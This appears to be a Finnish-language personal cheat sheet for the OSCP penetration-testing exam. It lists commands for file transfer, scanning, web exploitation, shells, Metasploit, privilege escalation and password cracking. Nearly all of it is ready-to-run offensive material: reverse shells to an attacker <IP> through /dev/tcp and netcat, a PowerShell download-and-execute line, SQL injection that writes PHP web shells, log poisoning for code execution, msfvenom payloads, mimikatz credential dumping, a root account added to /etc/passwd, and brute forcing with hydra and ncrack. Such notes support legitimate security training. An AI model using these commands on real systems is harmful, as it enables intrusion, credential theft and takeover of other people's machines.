###############################################

           Yleiset trickit

###############################################

* Muista kokeilla default salasanoja !!!!

* Muista kokeilla salasanoja eri paikkoihin => salasanojen uudelleenkäyttö!

* System variable: export ip=<IP>
 - Käyttö: $ip	

* https://github.com/Elinpf/OSCP-survival-guide

* Tiedostotyypin selvittäminen:
 - file tiedosto

* Base64 muunto:
 - base64 -d tiedosto > muunnettu

* SSL:n analysointi:
 - sslyze <IP> --heartbleed


###############################################

           Tiedostojen siirto

###############################################


# Fileservu pythonilla
 * python -m SimpleHTTPServer 8000

# FTP
 * Windowsissa: C:\Windows\System32\ftp.exe
 * Kalissa:
  - apt-get install python-pyftpdlib
  - python -m pyftpdlib -p 21
 * Metasploitilla:
  - use auxiliary/server/ftp
  - set FTPROOT /Files\ to\ download/
  - exploit

* Windowsissa ei-interaktiivisesti:
  - echo open <IP> 21> ftp.txt
  - echo USER offsec>> ftp.txt
  - echo ftp>> ftp.txt
  - echo bin >> ftp.txt
  - echo GET nc.exe >> ftp.txt
  - echo bye >> ftp.txt
  - ftp -v -n -s:ftp.txt

* Skripteillä (kts. kansio Tiedonsiirtoskriptit):
  - cscript wget.vbs http://<IP>/evil.exe evil.exe
  - powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

* Powershellillä:
  - powershell IEX(New-Object Net.WebClient).DownloadString('http://IP:80/accesschk.exe')
  - powershell Invoke-WebRequest -Uri "http://<IP>:80/accesschk.exe" -OutFile "C:\Users\Matti\AppData\Local\Temp\accesschk.exe"

* TFTP:
  - Kalissa: atftpd --daemon --port 69 <jaettava kansio>
  - Uhrikoneessa: tftp -i <IP> GET <tiedosto>


###############################################

           Skannailu ja enumeraatio

###############################################

# https://highon.coffee/blog/nmap-cheat-sheet/

# Palvelujen swiippaus aliverkosta
 * nmap -sS -p <palvelun portti> <IP>/<PEITE>

# Vulnien ja exploittien skannaus:
 * nmap -vv -n -Pn -A -sV --script vuln,exploit -p- -oA <IP>-scan <IP>
 * Kokeessa: nmap -vv -n -Pn -A -sV --script vuln,exploit -p- -oA <IP>-scan <IP>

# Nopea UDP:
 * nmap -n -vv -Pn -sU -p- 1000 <IP> -oA udp-scan-<IP> --max-retries 3 --min-rate 750

# FTP
 * Anonyymi kirjautuminen:
  - Käyttäjänimi: ftp tai anonymous
  - Salasana: mikä vain
 * FTP documents and settings
  - ls ../../../../Docume~1/
  - get ../../../../../../../../Docume~1/Matti/Desktop/servers.py
  - put kissa.exe ../../../../../../../../Docume~1/Matti/Desktop/servers.py
  - put kissa.exe "../../../../../../../../Docume~1/All Users/Desktop/"

# Nikto Burbin kera:
 * nikto -host <IP> -useproxy http://localhost:8080

# SMB enumerointi
 * nmap <IP> --script smb-os-discovery.nse
 * nbtscan -r <IP>
 * enum4linux -a <IP>
 * nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>
 * use auxiliary/scanner/smb/smb_version

# SMB vulnien skannaus
 * nmap -v --script "smb-vuln-*" -iL iplist.txt -oG smb_vuln_hosts_grep.txt > smb_vuln_hosts.txt

# SMB login
 * smbclient //THINC/wwwroot -I <IP> -N

# Lataa SMB-kansion sisältö rekursiivisesti
 * smbclient '//<IP>/tmp' -N -c 'prompt OFF;recurse ON;cd ;mget *'

# SMB checklist
 * https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
 * http://virgil-cj.blogspot.com/2018/02/enumeration-is-key_6.html

# SNMP enumerointi
 * snmp-check <IP> -c <public/private/community>

# Port-knocking
 * for x in 4000 5000 6000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x <IP>; done

# Portit
 * FTP: 21 (datan siirto portin 20 kautta)
 * SSH: 22
 * SMB: 139, 445
 * MySQL: 3306
 * RDP: 3389
 
# Nmap resume
nmap -oN your-results.nmap $HOST
Ctrl-C^ here
# then later
nmap --resume your-results.nmap


###############################################

           Webhommat

###############################################

* Jos ohjelma on open source, lataa sorsat ja katso mistä paikasta voisi löytää versionumeron
 - Kun tiedetään ladatun version versionumero, voidaan etsiä paikkoja, joissa se mainitaan: 
  * grep -R <versionumero> .
  * Tarpeen mukaan putkita vielä: | awk -F: '{print $1}' | uniq

* LFI/RFI:llä voi ajaa joko paikallista tai omaa koodia
 - Jos saa lokin kontaminoitua esim. Netcatilla laittaa: <?php echo shell_exec($_GET['cmd']);?>
  => Voi ajaa koodia, kun includoi esim. c:\xampp\apache\logs\access.log
 - Null bytellä (%00) lopussa toimii kommenttimerkin tavoin, kuten SQL injektiossa

* SQLi:
 - https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html
 - https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
 - Auth bypass: wronguser' or 1=1;# TAI wronguser' or 1=1 LIMIT 1;#
 - UNION-hyökkäystä varten enumeroi kolumnien määrä:
   * ?id=1 order by <numero>
   * Kokeile UNIONia tämän jälkeen:
     - ?id=1 union all select 1,2,3,4
     - ?id=1 union all select 1,@@version,3,4
     - ?id=1 union all select 1,2,3,table_name FROM information_schema.tables
 - Shellin teko:
  * ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
  * ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
  * backdoor.php?cmd=C:\Users\Administrator\Desktop\Tools\netcat\nc.exe <IP> 443 -e cmd.exe
 - Blind SQLi: Voi testata esim. ...id=768 and 1=1;# ja ...id=768 and 1=2;#
  * Jos eka antaa tuloksen, mutta jälkimmäinen ei, on kyseessä haavoittuva SQL-lauseke
  * Jos ei tule outputtia, käytetään aikahyökkäyksiä
   - Esim. ...id=768-sleep(5)
  * Ehdollinen aikahyökkäys: SELECT IF(MID(@@version,1,1) = '5', SLEEP(5), 0);

# Defaultit filepathit servuilla:
  * IIS: c:\Inetpub\wwwroot
  * Apache: /etc/apache2/

# WebDAV
  * cadaver http://<IP>:8080/webdav/
  * Default credut: wampp:xampp
  * Voi usein upata filuja PUTilla
  * Jos filun tyypillä rajoitus, uploadaa sallitun muotoinen filu ja MOVE:ta ajettavaksi muodoksi
  * Tyypin ohitus tyyliin: tiedosto.asp;.txt
  * Lisäämällä headerin "Translate: f" voi saada salattuja filuja esiin => dirb http://<IP> -H "Translate: f"
  * http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html

# PHP cheatsheet:
  * https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

###############################################

           Shellhommat

###############################################

# Msfvenomilla:
  - msfvenom -l payloads |grep "cmd/unix" |awk '{print $1}'
  - msfvenom -p cmd/unix/reverse_netcat LHOST=<IP> LPORT=4444 R

# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# https://highon.coffee/blog/reverse-shell-cheat-sheet/

# PHP onelinerit
1. Use http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet in place of the one liner
<?php echo shell_exec("[INSERT ONE LINER");?>

2. Guess programs on machine and use LFI to visit file
<?php echo shell_exec("/usr/local/bin/wget http://<IP>:8000/php-reverse-shell.php -O /var/tmp/shell.php 2>&1");?>


# TTY shellin hommaus
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within IRB)
exec "/bin/sh"
(From within vi)
:!bash
(From within vi)
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Reverse Bash shell
/bin/bash -i >& /dev/tcp/<IP>/4444 0>&1

# PHP Netcat shell
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'");?>

# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  # In reverse shell
  $ python -c 'import pty; pty.spawn("/bin/bash")'
  Ctrl-Z

  # In Kali
  $ stty raw -echo
  $ fg

  # In reverse shell
  $ reset
  $ export SHELL=bash
  $ export TERM=xterm-256color
  $ stty rows <num> columns <cols>

# Jos ifconfig ei toimi, kokeile /sbin/ifconfig
 * SunOS: ifconfig -a

# Yhteyksien tarkastelu Kalissa:
  - watch -d -n1 lsof -i

# https://github.com/xapax/security/blob/master/reverse-shell.md

###############################################

        	Metasploit

###############################################

* http://netsec.ws/?p=331

* Shellkoodin generointi:
  - Meterpreteriä voi kokeessa käyttää vain yhteen koneeseen!!!
  - msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f python -b "\x00..."
  - msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=443 -f perl
  - linux/x86/meterpreter/reverse_tcp

* Filun generointi:
  - EXE: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
  - ASP: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f asp > shell.asp
  - JSP: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f raw > shell.jsp
  - PHP: msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw > shell.php
  - WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f war > shell.war

* Multi/handler:
  - use multi/handler
  - set PAYLOAD windows/meterpreter/reverse_tcp
  - set LHOST <IP>
  - set LPORT 443

* Meterpreter
  - Send to background
  - Ctrl+Z

* Jatka sessiota 3:
  - sessions -i 3

* Shell to meterpreter:
  1. send to background
  2. use post/multi/manage/shell_to_meterpreter

* Mimikatz
  - load mimikatz
  - mimikatz_command -f privilege::debug
  - mimikatz_command -f samdump::hashes


###############################################

           Exploittien haku ja kääntäminen

###############################################

* searchsploit <hakusana>
  - Exploitin voi kopioida nykyiseen hakemistoon komennolla: searchsploit -m <polku exploittiin>

* Linuxexploitit:
  - gcc exploit.c -o exploit

* Windowsexploitit:
  - apt-get install mingw-w64
  - i686-w64-mingw32-gcc exploit.c -lws2_32 -o exploit.exe


###############################################

           Privescit

###############################################

* VNC Viewer: xtightvncviewer

# Näytä kaikki portit ja liikenne
  * Windows: netstat -ano
  * Linux: netstat -tulpn


## Linux privesc ##

* Cheatsheetit ja muut
 - https://payatu.com/blog_12
 - https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

* Enumeraatioskriptit:
 - ./LinEnum.sh
 - ./unix-privesc-check |grep WARNING
 - python linuxprivchecker.py extended
 - ./linux-exploit-suggester.sh TAI ./linux-exploit-suggester.sh --uname <uname-string>

* Aina ekaksi kokeile sudo -l

* DirtyCOW (Linux Kernel <= 3.19.0-73.8) ja muut kernel exploitit
 - https://www.exploit-db.com/exploits/40839
 - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 - ./dirty_cow hacker
 - su hacker

* Lokaalien ohjelmien exploittaus
 - netstat -antup, näyttää kaikki portit ja niissä pyörivät softat
 - ps -aux | grep root, listaa roottina ajettavat servicet

* SUID yms.
 - https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
 - SUID filujen haku:
  * Etsi editoreja, kääntäjiä, tulkkeja tms. => read/write oikat filuihin!
  * Nmap myös: nmap –interactive + !sh
  * find / -user root -perm -4000 -print 2>/dev/null
  * find / -perm -u=s -type f 2>/dev/null
 - World-writable filuja voi etsiä komennoilla:
  * find / -perm -2 ! -type l -ls 2>/dev/null
  * find / -perm -2 -type f 2>/dev/null

* SUDO-oikeuksien käyttö:
 - sudo find /home -exec sh -i \;
 - sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
 - vi, more, less, nmap, perl, ruby, python, gdb
 - https://gtfobins.github.io/#+sudo

* Cronjobs
 - 1. Any script or binaries in cron jobs which are writable?
   2. Can we write over the cron file itself.
   3. Is cron.d directory writable?
 - ls -la /etc/cron.d
 - find / -perm -2 -type f 2>/dev/null

* Uuden käyttäjän tekeminen
 - Passuhashin generointi:
  * openssl passwd -1 -salt username password
  * mkpasswd -m SHA-512 password
  * python -c 'import crypt; print crypt.crypt("password", "$6$salt")'
  * perl -le 'print crypt("password", "abc")'
  * php -r "print(crypt('username','password') . \"\n\");"
 - Lisää rivi /etc/passwd:hen: username:passu_hashi:0:0:/root/root:/bin/bash

* Hijack a binary's full path in bash to exec your own code
 $ function /usr/bin/foo () { /usr/bin/echo "It works"; }
 $ export -f /usr/bin/foo
 $ /usr/bin/foo
 It works


## Windows privesc ##

 * Cheatsheetit:
  - Windows_privesc.txt
  - https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
  - http://www.fuzzysecurity.com/tutorials/16.html
  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

 * ls -lah = dir /a
 * Rekursiivinen dir = dir /s
 * cat = type

 * Enumeraatioskriptit:
  - WindowsEnum: 
    * Normaali: .\WindowsEnum.ps1 TAI powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1
    * Extended: .\WindowsEnum.ps1 extended TAI powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended

 * Exploitteja voi hakea exploit-suggesterilla: ./windows-exploit-suggester.py --database 2019-09-20-mssb.xls --systeminfo 229_info.txt

 * RDP:n aktivointi: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

 * Windowsiin voi tehdä käyttäjän komennolla: net user <käyttäjänimi> <salasana> /add
 * Lisääminen grouppiin: net localgroup "Groupin nimi" <käyttäjänimi> /add
 
 * Servicet näkee komennolla: services.msc

 * Python-filusta saa exen: python pyinstaller.py --onefile ms11-080.py
  - Löytyy labran Win7-koneesta Tools-kansiosta

 * Mimikatz
  - load mimikatz
  - mimikatz_command -f privilege::debug
  - mimikatz_command -f samdump::hashes
    - msv
    - kerberos
    - NTLM 
    - ssp

 * Sekurlsa
  - mimikatz_command -f inject::process lsass.exe sekurlsa.dll
  - mimikatz_command -f sekurlsa::logonpasswords
  - mimikatz_command -f sekurlsa::searchPasswords

 * Lisätietoja:
  - https://blogs.technet.microsoft.com/markrussinovich/2006/05/01/the-power-in-power-users/
  - http://www.greyhathacker.net/?p=738


###############################################

           Salasanojen cräckäys

###############################################

# Sanalistat
 * SecList: /usr/share/seclists/

# Salasanojen crakays
 * unshadow passwd shadow > unshadowed.txt
 * john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Hydralla cräckäys:
 * https://github.com/frizb/Hydra-Cheatsheet
 * hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <IP> http-get /path

# RDP cräckäys:
 * ncrack -vv --user admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt rdp://<IP>

# FreeBSD:
 * Salasanat filussa /etc/master.passwd

# Zipin crackays:
 * fcrackzip -D -p /usr/share/wordlists/rockyou.txt crackattava.zip

